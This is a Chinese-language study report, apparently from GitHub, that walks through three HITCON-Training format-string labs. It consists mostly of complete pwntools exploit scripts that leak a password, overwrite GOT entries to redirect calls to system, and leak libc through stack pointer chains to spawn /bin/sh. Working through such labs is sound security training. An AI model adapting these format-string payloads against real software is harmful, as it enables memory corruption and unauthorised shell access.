# week2
## hitcon-training -- lab7(crack)
密码是随机生成的 存在格式化字符串漏洞

<img width="264" alt="image" src="https://github.com/keepinggg/Weekly_Report/assets/62430054/076b02b9-cc70-4179-80f0-a5335602685f">


可以利用格式化字符串读获取password
### exp_crack.py
```python
from pwn import *
p = process("./crack")
# p = remote("ip",port)
context.log_level = 'debug'
# context.arch = 'amd64'
# context(os="linux", arch="amd64",log_level = "debug")

r = lambda : p.recv()
rx = lambda x: p.recv(x)
ru = lambda x: p.recvuntil(x)
rud = lambda x: p.recvuntil(x, drop=True)
s = lambda x: p.send(x)
sl = lambda x: p.sendline(x)
sa = lambda x, y: p.sendafter(x, y)
sla = lambda x, y: p.sendlineafter(x, y)
shell = lambda : p.interactive()

password_addr = 0x804a048

payload = p32(password_addr) + b'#%10$s'
ru('name ? ')
sl(payload)

ru('#')
password = u32(rx(4))
log.info("password ==> {}".format(hex(password)))

ru('password :')
sl(str(password))

shell()
```

## hitcon-training -- lab8(craxme)
存在格式化字符串漏洞 

<img width="306" alt="image" src="https://github.com/keepinggg/Weekly_Report/assets/62430054/0c88b93b-709f-49dc-a22f-0b5c98d00d13">

可以用格式化字符串写漏洞复写全局变量magic

前两个复写的方式相同
### exp_craxme1.py
```python
from pwn import *
p = process("./craxme")
# p = remote("ip",port)
context.log_level = 'debug'
# context.arch = 'amd64'
# context(os="linux", arch="amd64",log_level = "debug")

r = lambda : p.recv()
rx = lambda x: p.recv(x)
ru = lambda x: p.recvuntil(x)
rud = lambda x: p.recvuntil(x, drop=True)
s = lambda x: p.send(x)
sl = lambda x: p.sendline(x)
sa = lambda x, y: p.sendafter(x, y)
sla = lambda x, y: p.sendlineafter(x, y)
shell = lambda : p.interactive()

magic_addr = 0x804a038
magic_data = 0xDA 

payload = fmtstr_payload(7, {magic_addr:magic_data}, write_size="byte")
ru("magic :")
sl(payload)

shell()

#raw_input("Ther")
```

### exp_craxme2.py
```python
from pwn import *
p = process("./craxme")
# p = remote("ip",port)
context.log_level = 'debug'
# context.arch = 'amd64'
# context(os="linux", arch="amd64",log_level = "debug")

r = lambda : p.recv()
rx = lambda x: p.recv(x)
ru = lambda x: p.recvuntil(x)
rud = lambda x: p.recvuntil(x, drop=True)
s = lambda x: p.send(x)
sl = lambda x: p.sendline(x)
sa = lambda x, y: p.sendafter(x, y)
sla = lambda x, y: p.sendlineafter(x, y)
shell = lambda : p.interactive()

magic_addr = 0x804a038
magic_data = 0xFACEB00C

payload = p32(magic_addr) + p32(magic_addr+2)
payload+= b"%45060c%7$hn%19138c%8$hn"

raw_input("Ther")
ru("magic :")
sl(payload)

shell()
```

具体说一下getshell的方法

程序中有system函数 所以我们是可以通过覆盖某个函数的got表为system来getshell的

但只有一次格式化字符串的机会 在格式化字符串函数之后 可能执行的分支为system和puts函数

<img width="318" alt="image" src="https://github.com/keepinggg/Weekly_Report/assets/62430054/30fe380e-80cf-4db0-b51b-901a4d9bfdd8">

但调用这两个函数的参数不可控，所以需要复写其他函数的got表 最后发现只有printf函数的参数可控

那么我们可以将puts的got表覆盖为main函数调用read的地址

同时将printf的got表覆盖为system

这样在程序继续执行时就会调用puts函数 然后跳转到read@main 继续执行一次read和printf

在执行到printf时真正调用的是system 我们的输入就是system的参数

### exp_craxme3.py
```python
from pwn import *
p = process("./craxme")
# p = remote("ip",port)
context.log_level = 'debug'
# context.arch = 'amd64'
# context(os="linux", arch="amd64",log_level = "debug")

r = lambda : p.recv()
rx = lambda x: p.recv(x)
ru = lambda x: p.recvuntil(x)
rud = lambda x: p.recvuntil(x, drop=True)
s = lambda x: p.send(x)
sl = lambda x: p.sendline(x)
sa = lambda x, y: p.sendafter(x, y)
sla = lambda x, y: p.sendlineafter(x, y)
shell = lambda : p.interactive()

pritnf_got = 0x804a010
puts_got = 0x804a018
read_main = 0x804859B
system_plt = 0x8048410

payload = p32(puts_got) + p32(puts_got+2) + p32(pritnf_got) + p32(pritnf_got+2)
payload+= b"%34187c%7$hn%33385c%8$hn%31756c%9$hn%33780c%10$hn"

raw_input("Ther")
ru("magic :")
sl(payload)

shell()
```

## hitcon-training -- lab9(playfmt)
无限制的非栈上的格式化字符串漏洞 输入quit结束

<img width="304" alt="image" src="https://github.com/keepinggg/Weekly_Report/assets/62430054/3242a192-fc3a-421f-84c0-78adda64fb1d">

这类题目首先看栈上有没有连着的指针 如下图

<img width="836" alt="image" src="https://github.com/keepinggg/Weekly_Report/assets/62430054/d4271576-2330-4cf1-a042-4d60e9f15bef">

这种指针可以帮助我们去泄漏或者修改栈上的一些地址 如libc

<img width="752" alt="image" src="https://github.com/keepinggg/Weekly_Report/assets/62430054/f890ba34-9a93-4634-a845-c5ac2e74c64f">

现在称三个指针分别为p1 p2 p3

我们可以通过修改p3为返回地址 然后读取p3的内容 就可以泄漏libc

```python
# leak stack pointer
payload = '#%6$p#%10$p\x00'
ru("=====================\n")
sl(payload)

ru('#')
p1 = int(rx(10),16)
ru('#')
p2 = int(rx(10),16)

success("p1 ==> {}".format(hex(p1)))
success("p2 ==> {}".format(hex(p2)))

mod1 = (p2+0x14) & 0xff


def write_data(idx, data):
	sleep(0.1)
	payload = '%' + str(data) + 'c%' + str(idx) + '$hhn'
	sl(payload)


write_data(6, mod1)

# leak libc 
sleep(0.1)
payload = '#%10$s'
sl(payload)

ru('#')
libc_start_main = u32(rx(4))
success("libc_start_main ==> {}".format(hex(libc_start_main)))
```

然后再将返回地址覆盖为libc_system 返回地址+8的位置覆盖为libc_binsh

在main函数返回时，就会调用system("/bin/sh")
```python
sys_mod1 = libc_system & 0xff
sys_mod2 = (libc_system >> 8) & 0xff
sys_mod3 = (libc_system >> 16) & 0xff

binsh_mod1 = libc_binsh & 0xff
binsh_mod2 = (libc_binsh >> 8) & 0xff
binsh_mod3 = (libc_binsh >> 16) & 0xff
binsh_mod4 = (libc_binsh >> 24) & 0xff

write_data(10, sys_mod1)

mod1 = (p2+0x14+1) & 0xff
write_data(6, mod1)

write_data(10, sys_mod2)

mod1 = (p2+0x14+2) & 0xff
write_data(6, mod1)

write_data(10, sys_mod3)

mod1 = (p2+0x14+8) & 0xff
write_data(6, mod1)

write_data(10, binsh_mod1)

mod1 = (p2+0x14+8+1) & 0xff
write_data(6, mod1)

write_data(10, binsh_mod2)

mod1 = (p2+0x14+8+2) & 0xff
write_data(6, mod1)

write_data(10, binsh_mod3)

mod1 = (p2+0x14+8+3) & 0xff
write_data(6, mod1)

raw_input("Ther")
write_data(10, binsh_mod4)

mod1 = (p2) & 0xff
write_data(6, mod1)
shell()
```

需要注意我们使用的ebp的指针链 在main函数返回时会使ebp改变 所以在最后需要将ebp链还原到原来的状态

### exp_playfmt.py
```python
from pwn import *
p = process("./playfmt")
# p = remote("ip",port)
context.log_level = 'debug'
# context.arch = 'amd64'
# context(os="linux", arch="amd64",log_level = "debug")

r = lambda : p.recv()
rx = lambda x: p.recv(x)
ru = lambda x: p.recvuntil(x)
rud = lambda x: p.recvuntil(x, drop=True)
s = lambda x: p.send(x)
sl = lambda x: p.sendline(x)
sa = lambda x, y: p.sendafter(x, y)
sla = lambda x, y: p.sendlineafter(x, y)
shell = lambda : p.interactive()

off_libc_start_main = 0x1ade0
off_system = 0x41780
off_binsh = 0x18e363

off1 = 6
off2 = 10
off3 = 14

printf_got = 0x804a010

# leak stack pointer
payload = '#%6$p#%10$p\x00'
ru("=====================\n")
sl(payload)

ru('#')
p1 = int(rx(10),16)
ru('#')
p2 = int(rx(10),16)

success("p1 ==> {}".format(hex(p1)))
success("p2 ==> {}".format(hex(p2)))

mod1 = (p2+0x14) & 0xff


def write_data(idx, data):
	sleep(0.1)
	payload = '%' + str(data) + 'c%' + str(idx) + '$hhn'
	sl(payload)


write_data(6, mod1)

# leak libc 
sleep(0.1)
payload = '#%10$s'
sl(payload)

ru('#')
libc_start_main = u32(rx(4))
success("libc_start_main ==> {}".format(hex(libc_start_main)))

libc_base = libc_start_main - off_libc_start_main - 245
success("libc_base ==> {}".format(hex(libc_base)))

libc_system = libc_base + off_system
success("libc_system ==> {}".format(hex(libc_system)))

libc_binsh = libc_base + off_binsh
success("libc_binsh ==> {}".format(hex(libc_binsh)))

sys_mod1 = libc_system & 0xff
sys_mod2 = (libc_system >> 8) & 0xff
sys_mod3 = (libc_system >> 16) & 0xff

binsh_mod1 = libc_binsh & 0xff
binsh_mod2 = (libc_binsh >> 8) & 0xff
binsh_mod3 = (libc_binsh >> 16) & 0xff
binsh_mod4 = (libc_binsh >> 24) & 0xff

write_data(10, sys_mod1)

mod1 = (p2+0x14+1) & 0xff
write_data(6, mod1)

write_data(10, sys_mod2)

mod1 = (p2+0x14+2) & 0xff
write_data(6, mod1)

write_data(10, sys_mod3)

mod1 = (p2+0x14+8) & 0xff
write_data(6, mod1)

write_data(10, binsh_mod1)

mod1 = (p2+0x14+8+1) & 0xff
write_data(6, mod1)

write_data(10, binsh_mod2)

mod1 = (p2+0x14+8+2) & 0xff
write_data(6, mod1)

write_data(10, binsh_mod3)

mod1 = (p2+0x14+8+3) & 0xff
write_data(6, mod1)

raw_input("Ther")
write_data(10, binsh_mod4)

mod1 = (p2) & 0xff
write_data(6, mod1)
shell()
```



